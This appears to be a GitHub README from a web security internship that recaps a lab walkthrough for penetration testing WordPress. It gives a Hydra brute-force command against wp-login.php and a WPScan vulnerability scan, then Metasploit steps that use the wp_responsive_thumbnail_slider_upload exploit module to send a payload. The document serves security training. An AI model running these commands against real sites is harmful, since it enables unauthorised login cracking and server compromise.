# WordPress penetration testing workflow

This workflow recaps the WordPress penetration testing walkthrough for the web security internship. 

## Lab environment
- [VMware](https://www.vmware.com/products/workstation-player.html)
- [Kali Linux](https://www.kali.org/get-kali/#kali-platforms)

## Tools 
- [Hydra](https://www.kali.org/tools/hydra/) - An open-source password cracking tool that searches usernames and passwords by brutal forcing using wordlists.
- [WPScan](https://www.kali.org/tools/wpscan/) - Scan a WordPress website for any vulnerabilities. 
- [Metasploit](https://www.kali.org/tools/metasploit-framework/) - An open-source vulnerability scanner that allows security researchers to find vulnerabilities on target machines and send payloads. 

## 1. Finding username and password
The first step is to find credentials to access the target WordPress website using Hydra. 

```
hydra -l user -P /usr/share/wordlists/rockyou.txt 00.00.00.000 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

`-l` Login

`-P` Password

`-V` Verbose mode

`/usr/share/wordlists/rockyou.txt` path to a wordlist. 

Replace 00.00.00.000 with the target IP address. 


## 2. Running vulnerability scanner using WPScan

The second step is to find vulnerabilities in the target WordPress website. WPScan searches for unpatched plugins or themes. You will need an API Token from [WPScan.com](https://wpscan.com/api). 

```
 wpscan --url 00.00.00.000 --api-token 000000000000000000000000000 > wpscan-results.txt
```

The results shows 3 vulnerabilities in **wp_responsive_thumbnail_slider_upload** plugin. 

![Screenshot of WPscan results.](https://github.com/TerumiB/Pentest-WP-workflow/blob/main/assets/1-wpscan.png)



## 3. Send payload using Metasploit

This step focuses on generating the payload against the target. 

#### 1. Start Metasploit

`msfconsole`

#### 2. Scan the WordPress

```
use auxiliary/scanner/http/wordpress_scanner
set RHOSTS 00.00.00.000
set VHOST 00.00.00.000
set WPUSERNAME user
set WPPASSWORD password
run
```

![Screenshot of Module current status.](https://github.com/TerumiB/Pentest-WP-workflow/blob/main/assets/3.jpg)

#### 3. Find available payloads for the unsecured plugin that you discovered in the previous step. In our case, it was **wp_responsive_thumbnail_slider_upload**.

`use auxiliary/scanner/http/wordpress_scanner` to scan WordPress vulnerabilities


```
use exploit/multi/http/wp_responsive_thumbnail_slider_upload
show targets
set TARGET 0
set RHOSTS 00.00.00.000
set VHOST 00.00.00.000
set WPUSERNAME user
set WPPASSWORD password
```

![Screenshot of Module setting.](https://github.com/TerumiB/Pentest-WP-workflow/blob/main/assets/2.jpg)

#### Optional

`show targets`   List available payloads

`show options` Confirm the necessary info is entered. 

#### 4. Send the payload to the target.
   
`exploit` 



### References

- Big thanks to the mentor Rob for the penetration testing walkthrough. 

-[Metasploit Module Library](https://www.infosecmatter.com/metasploit-module-library/)

